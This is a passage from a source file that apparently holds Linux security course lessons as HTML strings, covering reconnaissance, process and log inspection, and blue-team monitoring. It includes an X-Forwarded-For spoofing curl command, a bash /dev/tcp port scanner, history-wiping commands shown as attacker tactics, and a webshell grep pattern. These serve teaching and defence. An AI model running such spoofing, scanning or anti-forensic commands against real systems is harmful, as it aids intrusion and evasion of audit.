curl -H "X-Forwarded-For: 127.0.0.1" http://target.com</code></pre>

<h3>Port checking with bash</h3>
<pre><code># Check if a port is open
(echo >/dev/tcp/10.0.0.1/80) 2>/dev/null && echo "open" || echo "closed"

# Scan common ports without nmap
for port in 22 80 443 3306 3389 8080; do
  (echo >/dev/tcp/10.0.0.1/$port) 2>/dev/null && echo "Port $port open"
done</code></pre>

<h2>Process Inspection</h2>

<pre><code># What is listening on the network?
ss -tulnp | grep LISTEN

# Which process owns port 80?
ss -tlnp | grep ':80'
lsof -i :80

# All files open by a specific process
lsof -p 1234</code></pre>

<h2>Log Reading in Real Time</h2>

<pre><code># Watch auth log in real time
tail -f /var/log/auth.log

# Follow multiple logs
tail -f /var/log/auth.log /var/log/syslog

# Filter real-time stream
tail -f /var/log/apache2/access.log | grep "POST"

# Count events by hour
awk '{print $3}' /var/log/auth.log | cut -d: -f1 | sort | uniq -c</code></pre>
`,

    defense: `
<h2>Monitoring Commands for Blue Team</h2>

<h3>Who Is on the System?</h3>
<pre><code>$ who       # Logged-in users and their terminals
$ w         # Who is logged in + what they are doing
$ last      # Login history from /var/log/wtmp
$ lastb     # Failed login attempts (root only)</code></pre>

<p>
  During incident response, <code>who</code> and <code>w</code> are first checks.
  An unfamiliar user logged in from an unknown IP at 3 AM is your attacker.
</p>

<h3>Active Network Connections</h3>
<pre><code>$ ss -tulnp          # All listening services with process names
$ ss -tp             # All established TCP connections
$ ss -antp | grep ESTABLISHED</code></pre>

<p>
  Look for unexpected outbound connections. A web server connected to an external IP on
  port 4444 (Metasploit default) is a major red flag.
</p>

<h3>Command History Audit</h3>
<pre><code>$ history
$ cat /home/*/.bash_history 2>/dev/null
$ cat /root/.bash_history</code></pre>

<blockquote>
  Attackers often destroy history: <code>history -c</code> or <code>unset HISTFILE</code>.
  Check with: <code>echo $HISTFILE</code>
</blockquote>

<h2>File Integrity Checking</h2>

<pre><code># Generate baseline hashes
$ sha256sum /usr/bin/passwd /etc/passwd /etc/shadow > baseline.sha256

# Verify against baseline later
$ sha256sum -c baseline.sha256

# Files modified in last 24 hours
find / -mtime -1 -type f 2>/dev/null | grep -v /proc | grep -v /sys

# New files in /tmp (attacker staging area)
find /tmp /var/tmp -newer /etc/passwd -type f 2>/dev/null

# PHP webshell detection
grep -r "eval(base64_decode" /var/www/ 2>/dev/null</code></pre>

<h2>Authentication Log Patterns</h2>

<pre><code># Brute-force: many failures from same IP
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head

# Successful logins — check for unfamiliar IPs
grep "Accepted password\|Accepted publickey" /var/log/auth.log

# Root logins
grep "session opened for user root" /var/log/auth.log

# sudo usage
grep "sudo:" /var/log/auth.log

# journalctl (systemd systems)
$ journalctl -u sshd --since "2024-01-01"
$ journalctl -p err -n 50
$ journalctl -f</code></pre>

<h2>Man Pages and Getting Help</h2>

<pre><code>$ man nmap                       # Full manual (/ to search)
$ man -k "file permission"       # Search man pages by keyword
$ nmap --help | grep "\-p"       # Filter help output
$ curl --help all | less         # Full help with pagination</code></pre>

<h2>Shell Security Hardening</h2>

<pre><code># Prevent history tampering
$ readonly HISTFILE

# Log timestamps for all commands
$ export HISTTIMEFORMAT="%F %T "

# Maximize history retention
$ export HISTSIZE=100000
$ export HISTFILESIZE=100000

# Append immediately, not just on exit
$ export PROMPT_COMMAND="history -a"

# Who can use sudo?
$ sudo -l                        # Current user's sudo permissions
$ cat /etc/sudoers               # Full sudoers (root only)
$ grep -r sudo /etc/sudoers.d/   # Additional sudo rules</code></pre>
`,
  },

}
